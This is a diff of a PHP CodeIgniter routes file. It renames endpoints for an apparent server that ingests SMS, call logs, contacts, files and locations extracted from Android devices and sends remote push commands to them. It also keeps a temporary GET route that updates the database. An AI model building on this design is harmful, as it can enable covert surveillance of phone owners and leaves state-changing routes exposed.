@@ -46,7 +46,7 @@ $routes->post('contactus', 'ContactController::send');
 // Temporary backfill route (remove after use)
 $routes->get('admin/backfill-created-at', function() {
     $db = \Config\Database::connect();
-    $db->query("UPDATE tbl_device_profile SET created_at = extraction_timestamp WHERE created_at IS NULL;");
+    $db->query("UPDATE tbl_device_profiles SET created_at = extraction_timestamp WHERE created_at IS NULL;");
     return "Updated " . $db->affectedRows() . " rows";
 });
 
@@ -435,6 +435,7 @@ $routes->group('', [
         $routes->get('map/(:num)', 'Location::map/$1');
         $routes->get('(:num)', 'Location::simplified/$1');
         $routes->post('delete/(:num)', 'Location::delete/$1');
+        $routes->post('delete-paired/(:any)', 'Location::deletePaired/$1');
     });
 
     // Activity Routes
@@ -824,6 +825,7 @@ $routes->group('', [
         $routes->get('progress/(:num)', 'Anomalies::progress/$1', ['as' => 'anomalies-progress']);
         $routes->get('status/(:num)',   'Anomalies::status/$1',   ['as' => 'anomalies-status']);
         $routes->post('process/(:num)','Anomalies::process/$1',  ['as' => 'anomalies-process']);
+        $routes->post('start',         'Anomalies::startScan',       ['as' => 'anomalies-start']);
         $routes->get('advanced',       'Anomalies::upgradeAdvanced', ['as' => 'anomalies-advanced']);
     });
 
@@ -1156,7 +1158,7 @@ $routes->group('api/v1', [
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('token/verify', 'Receive::token_verify', ['as' => 'api-token-verify']);
+    $routes->post('tokens/verify', 'Receive::token_verify', ['as' => 'api-token-verify']);
 
     // -------------------------------------------------------------
     // 6.2 DEVICE REGISTRATION & MANAGEMENT
@@ -1167,32 +1169,43 @@ $routes->group('api/v1', [
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('device/print', 'Receive::device_print', ['as' => 'api-device-print']);
+    $routes->post('devices/fingerprints', 'Receive::device_print', ['as' => 'api-device-print']);
 
     /**
      * Checks device status.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->get('device/status', 'Receive::device_status', ['as' => 'api-device-status']);
+    $routes->get('devices/status', 'Receive::device_status', ['as' => 'api-device-status']);
 
     /**
      * Sync device config + permissions from Android device.
      */
-    $routes->post('device/config/sync', 'DeviceConfigController::sync', ['as' => 'api-device-config-sync']);
+    $routes->post('devices/config/sync', 'DeviceConfigController::sync', ['as' => 'api-device-config-sync']);
+    $routes->put('devices/config/sync', 'DeviceConfigController::sync');
 
     /**
      * Fetch last known device config.
      */
-    $routes->get('device/config/(:any)', 'DeviceConfigController::fetch/$1', ['as' => 'api-device-config-fetch']);
+    $routes->get('devices/config/(:any)', 'DeviceConfigController::fetch/$1', ['as' => 'api-device-config-fetch']);
 
     /**
      * Fetch app defaults for Android devices.
      */
-    $routes->get('device/defaults', 'DeviceConfigController::defaults', ['as' => 'api-device-defaults']);
+    $routes->get('devices/defaults', 'DeviceConfigController::defaults', ['as' => 'api-device-defaults']);
+
+    /**
+     * Receives device health check diagnostics updates.
+     */
+    $routes->post('devices/health-update', 'Receive::health_update', ['as' => 'api-device-health-update']);
+
+    /**
+     * Retrieves the latest health check diagnostics record for a device.
+     */
+    $routes->get('devices/health-latest/(:any)', 'Receive::health_latest/$1', ['as' => 'api-device-health-latest']);
 
     // -------------------------------------------------------------
-    // 6.3 DATA UPLOAD ENDPOINTS
+    // 6.3 DATA INGESTION ENDPOINTS
     // -------------------------------------------------------------
 
     /**
@@ -1203,60 +1216,60 @@ $routes->group('api/v1', [
     $routes->post('files/upload', 'Receive::upload', ['as' => 'api-files-upload']);
 
     /**
-     * Uploads SMS data.
+     * Ingests SMS data.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('data/sms', 'Receive::upload_sms', ['as' => 'api-data-sms']);
+    $routes->post('extracted/sms', 'Receive::upload_sms', ['as' => 'api-data-sms']);
 
     /**
-     * Uploads call logs data.
+     * Ingests call logs data.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('data/calls', 'Receive::upload_calls', ['as' => 'api-data-calls']);
+    $routes->post('extracted/call-logs', 'Receive::upload_calls', ['as' => 'api-data-calls']);
 
     /**
-     * Uploads contacts data.
+     * Ingests contacts data.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('data/contacts', 'Receive::upload_contacts', ['as' => 'api-data-contacts']);
+    $routes->post('extracted/contacts', 'Receive::upload_contacts', ['as' => 'api-data-contacts']);
 
     /**
-     * Uploads apps data.
+     * Ingests apps data.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('data/apps', 'Receive::upload_apps', ['as' => 'api-data-apps']);
+    $routes->post('extracted/installed-apps', 'Receive::upload_apps', ['as' => 'api-data-apps']);
 
     /**
-     * Uploads files metadata.
+     * Ingests files metadata.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('data/files', 'Receive::upload_files', ['as' => 'api-data-files']);
+    $routes->post('extracted/device-files', 'Receive::upload_files', ['as' => 'api-data-files']);
 
     /**
-     * Uploads location data.
+     * Ingests location data.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('data/location', 'Receive::upload_location', ['as' => 'api-data-location']);
+    $routes->post('extracted/locations', 'Receive::upload_location', ['as' => 'api-data-location']);
 
     /**
-     * Uploads misc_software composite data.
+     * Ingests software telemetry composite data.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('data/misc_software', 'Receive::upload_misc_software', ['as' => 'api-data-misc-software']);
+    $routes->post('telemetry/software', 'Receive::upload_misc_software', ['as' => 'api-data-misc-software']);
 
     /**
-     * Uploads misc_hardware composite data.
+     * Ingests hardware telemetry composite data.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->post('data/misc_hardware', 'Receive::upload_misc_hardware', ['as' => 'api-data-misc-hardware']);
+    $routes->post('telemetry/hardware', 'Receive::upload_misc_hardware', ['as' => 'api-data-misc-hardware']);
 
     // -------------------------------------------------------------
     // 6.4 DATA RETRIEVAL ENDPOINTS (Read-only)
@@ -1267,34 +1280,34 @@ $routes->group('api/v1', [
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->get('account/info', 'Receive::account_info', ['as' => 'api-account-info']);
+    $routes->get('account', 'Receive::account_info', ['as' => 'api-account-info']);
 
     /**
      * Retrieves configuration data.
      *
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
-    $routes->get('config', 'Receive::config', ['as' => 'api-config']);
+    $routes->get('configs', 'Receive::config', ['as' => 'api-config']);
 
     // -------------------------------------------------------------
-    // -------------------------------------------------------------
-    // 6.6 REMOTE COMMAND ENDPOINTS
+    // 6.5 REMOTE COMMAND ENDPOINTS
     // -------------------------------------------------------------
 
     /**
-     * Sends a remote command to a device.
+     * Sends a remote command to a device (POST only for REST idempotency).
      */
-    $routes->match(['get', 'post'], "fcm/send/(:any)/(:any)/(:any)", "FCMCommandController::send/$1/$2/$3", ["as" => "api-fcm-send"]);
-    $routes->match(['get', 'post'], "fcm/send/(:any)/(:any)", "FCMCommandController::send/$1/$2", ["as" => "api-fcm-send-short"]);
-    $routes->match(['get', 'post'], "fcm/trigger/(:any)/(:any)", "FCMCommandController::trigger/$1/$2", ["as" => "api-fcm-trigger"]);
-    $routes->match(['get', 'post'], "fcm/trigger/(:any)", "FCMCommandController::trigger/$1", ["as" => "api-fcm-trigger-short"]);
+    $routes->post("fcm-commands/(:any)/(:any)/(:any)", "FCMCommandController::send/$1/$2/$3", ["as" => "api-fcm-send"]);
+    $routes->post("fcm-commands/(:any)/(:any)", "FCMCommandController::send/$1/$2", ["as" => "api-fcm-send-short"]);
+    $routes->post("fcm-triggers/(:any)/(:any)", "FCMCommandController::trigger/$1/$2", ["as" => "api-fcm-trigger"]);
+    $routes->post("fcm-triggers/(:any)", "FCMCommandController::trigger/$1", ["as" => "api-fcm-trigger-short"]);
 
     /**
      * Acknowledgment callback from Android device after processing a command.
      */
-    $routes->post("fcm/ack/(:num)", "FCMCommandController::ack/$1", ["as" => "api-fcm-ack"]);
+    $routes->post("command-acknowledgements/(:num)", "FCMCommandController::ack/$1", ["as" => "api-fcm-ack"]);
 
-    // 6.5 UTILITY & HEALTH CHECK ENDPOINTS
+    // -------------------------------------------------------------
+    // 6.6 UTILITY & HEALTH CHECK ENDPOINTS
     // -------------------------------------------------------------
 
     /**
@@ -1317,6 +1330,12 @@ $routes->group('api/v1', [
      * @return \CodeIgniter\HTTP\ResponseInterface
      */
     $routes->get('version', 'Receive::version_check', ['as' => 'api-version-check']);
+
+    // -------------------------------------------------------------
+    // 6.7 DATATABLE DRILLDOWN ENDPOINTS
+    // -------------------------------------------------------------
+    $routes->post('datatables/app-usage', 'DatatableAPI::getAppUsageDetails', ['as' => 'adv-datatable-app-usage']);
+    $routes->post('datatables/notifications', 'DatatableAPI::getNotificationDetails', ['as' => 'adv-datatable-notifications']);
 });
 
 // =================================================================
@@ -2049,6 +2068,20 @@ if (ENVIRONMENT === 'development') {
 // =================================================================
 // 10. CATCH-ALL ROUTE (Must be last)
 // =================================================================
+
+// Catch-all fallback for unmatched API routes to ensure they return JSON
+$routes->group('api', function ($routes) {
+    $routes->add('(:any)', function () {
+        return service('response')
+            ->setStatusCode(404)
+            ->setJSON([
+                'success' => false,
+                'status'  => 404,
+                'error'   => 'Not Found',
+                'message' => 'The requested API endpoint does not exist.'
+            ]);
+    });
+});
 
 // Any other route not matched above goes to 404 error page
 $routes->get('(:any)', function () {
